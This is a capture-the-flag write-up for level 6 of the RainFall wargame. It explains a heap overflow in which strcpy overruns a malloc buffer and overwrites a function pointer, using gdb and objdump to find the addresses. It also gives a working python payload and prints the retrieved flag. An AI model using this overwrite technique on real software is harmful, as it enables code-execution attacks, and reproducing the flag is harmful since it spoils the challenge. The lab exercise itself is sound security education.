## Level6

You can find the decompiled level6 code [here](./level6_decomp.c).

There are several interesting parts in this decomp, first of all, two functions `m()` and `n()`. `m()` doesn't do much, but is used inside the main, and `n()` which cat the password.

We also noticed that it segfaults after 72 characters:
```bash
level6@RainFall:~$ ./level6 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr
Segmentation fault (core dumped)
```

### Decomp analysis

```c
void main(undefined4 param_1,int param_2)
{
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```

`__dest` is the adress of our first malloc and is used as the `strcpy()` destination buffer, this is the only influence we have on the program since this copies `argv[1]` to `__dest`.

The second important point is `ppcVar1`, which is also allocated with a size of 4. It's a pointer to function, in this case pointing to `m()`.

After the call to `strcpy()` it will execute the function pointed to by `ppcVar1`

## Exploit

Our goal is to change the address of the pointer to function, so that instead of executing `m()`, we can execute something else. In this case there is also another function: `n()` which prints the password.

### Finding the address of `n()`

We can use `objdump -d level6 | grep "<n>"` which will output: `08048454 <n>:`

### Finding both malloc return address

We need both the buffer and pointer to function address, we used `gdb` for that:

Using `disas main` will prompt us with the following:

```bash
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
```

To get the address of `__dest`, we will set a breakpoint after the first malloc and check its return address:

```bash
(gdb) b *main+21
Breakpoint 1 at 0x8048491
(gdb) r
Starting program: /home/user/level6/level6 

Breakpoint 1, 0x08048491 in main ()
(gdb) x $eax
0x804a008:	0x00000000
(gdb) 
```

So `__dest` is located at `0x804a008`.

We will do the same for `ppcVar1`:

```bash
(gdb) b *main+37
Breakpoint 1 at 0x80484a1
(gdb) r
Starting program: /home/user/level6/level6 hihi

Breakpoint 1, 0x080484a1 in main ()
(gdb) x $eax
0x804a050:	0x00000000
(gdb) 
```

`ppcVar1` is located at `0x804a050`

### Addr offset

We can now get the size we need to fill with our buffer:

```python
>>> print(int(0x804a050) - int(0x804a008))
72
```

## Payload

<details>
    <summary>Spoiler</summary>
Now that we have all of our variables, we can replace the address of `m()` by `n()`'s in `ppcVar1`. To do that we will fill the buffer and the remaining space that we calculated just above, then pass our new memory address:

`[72 filler] + [n() addr]`

`python -c "print'A' * 72 + '\x54\x84\x04\x08'"> /var/crash/pay.txt`

Since we need to pass our payload as an argument (previous exercises were mostly done using `fgets()`), we need to store the content of the file inside a shell variable as such:

`level6@RainFall:~$ file_args=$(</var/crash/pay.txt)`

We can then use this variable as an argument and get our flag:

```bash
level6@RainFall:~$ ./level6 $file_args 
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
</details>